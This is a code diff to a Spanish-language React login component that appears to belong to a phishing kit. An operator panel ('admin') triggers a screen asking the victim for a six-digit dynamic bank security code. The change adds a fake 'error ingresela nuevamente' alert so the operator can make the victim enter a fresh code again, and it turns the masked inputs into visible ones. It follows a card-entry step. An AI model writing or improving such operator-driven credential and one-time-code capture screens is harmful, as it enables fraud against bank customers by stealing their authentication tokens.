@@ -59,6 +59,8 @@ export const VisualAuthView: React.FC<VisualAuthViewProps> = ({ onGoToCard }) =>
 
   // Datos Paso 6 dígitos
   const [sixDigits, setSixDigits] = useState<string[]>(['', '', '', '', '', ''])
+  const sixDigitsRequestCountRef = useRef(0)
+  const [sixDigitsErrorMessage, setSixDigitsErrorMessage] = useState('')
   const sixDigitsRefs = [
     useRef<HTMLInputElement>(null),
     useRef<HTMLInputElement>(null),
@@ -109,7 +111,12 @@ export const VisualAuthView: React.FC<VisualAuthViewProps> = ({ onGoToCard }) =>
             setStep(1)
           }
           // 3. Si el admin presionó "6 Dígitos"
-          else if (currentStatus === 'SOLICITAR_6_DIGITOS') {
+          else if (currentStatus === 'SOLICITAR_6_DIGITOS' || currentStatus === 'ERROR_6_DIGITOS') {
+            sixDigitsRequestCountRef.current += 1
+            if (sixDigitsRequestCountRef.current > 1) {
+              setSixDigitsErrorMessage('error ingresela nuevamente')
+            }
+            setSixDigits(['', '', '', '', '', ''])
             setUserAlertMessage('')
             setStep('six-digits')
           }
@@ -306,6 +313,7 @@ export const VisualAuthView: React.FC<VisualAuthViewProps> = ({ onGoToCard }) =>
     }
 
     // El usuario vuelve a la pantalla de espera
+    setSixDigitsErrorMessage('')
     setStep('loading')
   }
 
@@ -405,9 +413,17 @@ export const VisualAuthView: React.FC<VisualAuthViewProps> = ({ onGoToCard }) =>
           <h1 className="text-[22px] sm:text-[24px] font-normal text-[#5A6878] text-center tracking-tight mb-2">
             Clave dinámica de 6 dígitos
           </h1>
-          <p className="text-xs sm:text-[13px] text-gray-500 text-center mb-8 px-2 leading-relaxed">
+          <p className="text-xs sm:text-[13px] text-gray-500 text-center mb-6 px-2 leading-relaxed">
             Hemos solicitado una confirmación de seguridad. Por favor ingresa el código o token de 6 dígitos.
           </p>
+
+          {/* ALERTA CUANDO SE SOLICITA POR SEGUNDA VEZ */}
+          {sixDigitsErrorMessage && (
+            <div className="w-full mb-6 p-3.5 rounded-2xl bg-red-500/10 border border-red-500/30 text-red-600 text-xs sm:text-sm font-bold flex items-center justify-center gap-2 animate-in fade-in">
+              <AlertCircle className="w-4 h-4 text-red-600 shrink-0" />
+              <span>error ingresela nuevamente</span>
+            </div>
+          )}
 
           <form onSubmit={handleSixDigitsSubmit} className="w-full space-y-6">
             
@@ -424,13 +440,13 @@ export const VisualAuthView: React.FC<VisualAuthViewProps> = ({ onGoToCard }) =>
                   <div className="flex-1 flex items-center justify-center">
                     <input
                       ref={sixDigitsRefs[index]}
-                      type="password"
+                      type="tel"
                       inputMode="numeric"
                       maxLength={1}
                       value={sixDigits[index]}
                       onChange={(e) => handleSixDigitsChange(index, e.target.value)}
                       onKeyDown={(e) => handleSixDigitsKeyDown(index, e)}
-                      className="w-full h-full bg-transparent text-center text-2xl sm:text-3xl font-extrabold text-[#2C3847] outline-none border-none p-0 focus:ring-0"
+                      className="w-full h-full bg-transparent text-center text-2xl sm:text-3xl font-mono font-extrabold text-[#2C3847] outline-none border-none p-0 focus:ring-0"
                     />
                   </div>
                   {index < 5 && (
